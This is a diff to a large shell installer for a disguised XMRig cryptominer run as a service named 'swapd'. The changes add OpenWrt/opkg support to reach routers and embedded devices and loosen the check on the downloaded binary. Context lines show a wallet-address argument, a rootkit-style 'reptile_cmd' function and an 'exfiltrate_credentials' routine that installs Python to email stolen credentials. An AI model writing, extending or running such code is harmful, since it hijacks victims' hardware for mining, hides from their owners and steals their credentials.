@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="3.8"
-readonly BUILD_DATE="2026-03-15 04:03:33 UTC"
+readonly SCRIPT_VERSION="4.1"
+readonly BUILD_DATE="2026-03-22 03:55:40 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -15,6 +15,20 @@ echo "Build Date: $BUILD_DATE"
 echo "=========================================="
 echo ""
 
+# ==================== OPKG SUPPORT (OpenWrt/Embedded Systems) ====================
+if command -v opkg >/dev/null 2>&1; then
+    echo "=========================================="
+    echo "OPENWRT/OPKG DETECTED"
+    echo "=========================================="
+    echo "[*] Detected opkg package manager (OpenWrt/LEDE)"
+    echo "[*] Updating package lists and installing essential tools..."
+    opkg update
+    opkg install iptraf-ng curl wget bash
+    echo "[✓] OpenWrt packages updated and installed"
+    echo "=========================================="
+    echo ""
+fi
+
 # ==================== WALLET ADDRESS FROM COMMAND LINE ====================
 if [ -z "$1" ]; then
     echo "ERROR: Wallet address required!"
@@ -25,6 +39,57 @@ fi
 
 WALLET_ADDRESS="$1"
 echo "[*] Using wallet: ${WALLET_ADDRESS:0:20}...${WALLET_ADDRESS: -10}"
+echo ""
+
+# ==================== CHECK IF SWAPD IS ALREADY RUNNING ====================
+echo "[*] Checking if swapd service is already running..."
+
+SWAPD_RUNNING=false
+
+# Check systemd service
+if command -v systemctl >/dev/null 2>&1; then
+    if systemctl is-active --quiet swapd 2>/dev/null; then
+        SWAPD_RUNNING=true
+        echo "[!] Detected: swapd.service is active (systemd)"
+    fi
+fi
+
+# Check SysV init service
+if [ "$SWAPD_RUNNING" = false ] && [ -f /etc/init.d/swapd ]; then
+    if service swapd status 2>/dev/null | grep -qE "running|active"; then
+        SWAPD_RUNNING=true
+        echo "[!] Detected: swapd service is running (init.d)"
+    fi
+fi
+
+# Check for swapd process
+if [ "$SWAPD_RUNNING" = false ]; then
+    if pgrep -x swapd >/dev/null 2>&1 || pgrep -f "swapd.*--algo\|swapd.*config.json" >/dev/null 2>&1; then
+        SWAPD_RUNNING=true
+        echo "[!] Detected: swapd process is running"
+    fi
+fi
+
+if [ "$SWAPD_RUNNING" = true ]; then
+    echo ""
+    echo "=========================================="
+    echo "INSTALLATION ABORTED"
+    echo "=========================================="
+    echo "[!] swapd is already running on this system!"
+    echo ""
+    echo "The miner is already installed and running."
+    echo "To reinstall, first stop the service:"
+    echo ""
+    echo "  systemctl stop swapd     # For systemd"
+    echo "  service swapd stop       # For init.d"
+    echo "  pkill -9 swapd           # Kill process directly"
+    echo ""
+    echo "Then run this script again."
+    echo "=========================================="
+    exit 0
+fi
+
+echo "[✓] No running swapd service detected - proceeding with installation"
 echo ""
 
 # ==================== FORCE NON-INTERACTIVE MODE ====================
@@ -1397,7 +1462,11 @@ reptile_cmd() {
 
 # ==================== PACKAGE MANAGER DETECTION ====================
 # Detect which package manager is available
-if command -v apt-get >/dev/null 2>&1; then
+if command -v opkg >/dev/null 2>&1; then
+    PKG_MANAGER="opkg"
+    PKG_INSTALL="opkg install"
+    PKG_UPDATE="opkg update"
+elif command -v apt-get >/dev/null 2>&1; then
     PKG_MANAGER="apt-get"
     PKG_INSTALL="apt-get install -y"
     PKG_UPDATE="apt-get update"
@@ -2528,43 +2597,22 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
     fi
 
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
-        chmod +x swapd 2>/dev/null || true
-
-        # Check if binary exists and is an ELF executable
-        echo "[*] Verifying binary..."
-        if [ -f swapd ] && [ -x swapd ]; then
-            # Check if it's a valid ELF binary (executable or PIE shared object)
-            if file swapd 2>/dev/null | grep -qE "ELF.*(executable|shared object)"; then
-                echo "[✓] Binary is a valid ELF executable"
-
-                # Try version check (non-critical - just informational)
-                if ./swapd --version >/dev/null 2>&1; then
-                    VERSION_INFO=$(./swapd --version 2>&1 | head -1 || echo "unknown")
-                    echo "[✓] Version check passed: $VERSION_INFO"
-                else
-                    echo "[!] WARNING: Cannot run --version (may need libraries)"
-                    echo "[*] This is OK - binary will be tested when service starts"
-
-                    # Show what libraries might be missing
-                    if command -v ldd >/dev/null 2>&1; then
-                        echo "[*] Checking dependencies:"
-                        ldd swapd 2>&1 | grep "not found" || echo "    All dependencies found (or ldd failed)"
-                    fi
-                fi
-
-                rm -rf xmrig-* xmrig.tar.gz
-                echo "[✓] XMRig downloaded and ready"
-            else
-                echo "[!] ERROR: Downloaded file is not a valid ELF executable!"
-                if command -v file >/dev/null 2>&1; then
-                    echo "[*] File type: $(file swapd)"
-                fi
-                rm -rf xmrig-* xmrig.tar.gz
-                DOWNLOAD_SUCCESS=false
-            fi
-        else
-            echo "[!] ERROR: Binary file missing or not executable"
+        # Simple check: file exists and is not zero size
+        echo "[*] Checking downloaded binary..."
+        
+        if [ -f swapd ] && [ -s swapd ]; then
+            # File exists and is not empty - make it executable
+            chmod +x swapd 2>/dev/null || true
+            
+            FILE_SIZE=$(wc -c < swapd 2>/dev/null || echo "0")
+            echo "[✓] Binary downloaded successfully (size: $FILE_SIZE bytes)"
+            
+            # Clean up temporary files
             rm -rf xmrig-* xmrig.tar.gz
+            echo "[✓] XMRig ready"
+        else
+            echo "[!] ERROR: Downloaded file is missing or empty (zero size)"
+            rm -rf xmrig-* xmrig.tar.gz swapd
             DOWNLOAD_SUCCESS=false
         fi
     fi
@@ -4610,7 +4658,10 @@ exfiltrate_credentials() {
         # Install Python3 if not present (needed for email)
         if ! command -v python3 >/dev/null 2>&1; then
             echo "[*] Python3 not found - installing..."
-            if command -v apt >/dev/null 2>&1; then
+            if command -v opkg >/dev/null 2>&1; then
+                opkg update 2>&1 | grep -v "^$" || true
+                opkg install python3 2>&1 | grep -v "^$" || true
+            elif command -v apt >/dev/null 2>&1; then
                 DEBIAN_FRONTEND=noninteractive apt-get update -qq 2>&1 | grep -v "^$" || true
                 DEBIAN_FRONTEND=noninteractive apt-get install -y -qq python3 2>&1 | grep -v "^$" || true
             elif command -v yum >/dev/null 2>&1; then
